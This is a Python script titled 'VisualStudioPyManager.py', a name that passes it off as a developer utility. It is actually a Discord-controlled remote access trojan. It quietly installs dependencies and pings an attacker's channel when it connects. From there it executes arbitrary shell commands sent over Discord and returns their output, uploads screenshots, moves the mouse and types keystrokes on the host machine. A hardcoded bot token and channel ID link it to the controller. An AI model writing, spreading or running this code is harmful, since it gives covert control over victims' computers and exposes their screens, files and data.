# ============================
# VisualStudioPyManager.py
# ============================

import sys
import subprocess

# ----------------------------
# Auto-install required packages
# ----------------------------
required_packages = ["discord.py", "pyautogui"]

for package in required_packages:
    try:
        __import__(package)  # Try to import first
    except ImportError:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
        print(f"Installed {package}, please restart the script.")
        sys.exit()  # Exit so next run can import properly

# ----------------------------
# Imports (safe after installation)
# ----------------------------
import os
import discord
from discord.ext import commands
import pyautogui
import subprocess

# ----------------------------
# Configuration
# ----------------------------
TOKEN = "MTQxMjA1NjU2NzM0MzQ4MDkzMw(ket)GuauYR(ket)vPCRndJxzVrRwG1fHxkvYQjqU__nd-mshcP2s(zro)"  # <-- Replace with your bot token
CHANNEL_ID = 1310223800197189677  # <-- Replace with your channel ID to send connect message
save_dir = os.getenv("APPDATA")  # Save screenshots in %AppData%

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# ----------------------------
# Bot Events
# ----------------------------
@bot.event
async def on_ready():
    print(f"Bot connected: {bot.user}")
    try:
        channel = bot.get_channel(CHANNEL_ID)
        if channel:
            await channel.send("@everyone HARIFY KPAV ✅")
        else:
            print("Channel not found. Check CHANNEL_ID.")
    except Exception as e:
        print(f"Failed to send notification: {e}")

# ----------------------------
# Bot Commands
# ----------------------------

# Run shell commands
@bot.command(name="cmd")
async def run_cmd(ctx, *, command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True)
        if len(result) > 1900:
            for i in range(0, len(result), 1900):
                await ctx.send(f"```\n{result[i:i+1900]}\n```")
        else:
            await ctx.send(f"```\n{result}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Error:\n```\n{e.output}\n```")

# Take screenshot
@bot.command(name="screenshot")
async def screenshot(ctx):
    path = os.path.join(save_dir, f"screenshot_{int(os.times().system)}.png")
    img = pyautogui.screenshot()
    img.save(path)
    await ctx.send(file=discord.File(path))

# Move mouse
@bot.command(name="mouse")
async def move_mouse(ctx, x: int, y: int):
    try:
        pyautogui.moveTo(x, y)
        await ctx.send(f"Mkinky poxec depi: ({x}, {y})")
    except Exception as e:
        await ctx.send(f"Error mkniky sharjeluc: {e}")

# Type text as keyboard input
@bot.command(name="keyboard")
async def type_text(ctx, *, text: str):
    try:
        pyautogui.write(text)
        await ctx.send(f"TExty greci: {text}")
    except Exception as e:
        await ctx.send(f"Error texty greluc: {e}")

# ----------------------------
# Run Bot
# ----------------------------
try:
    bot.run(TOKEN)
except Exception as e:
    print("Error boty skseluc:", e)
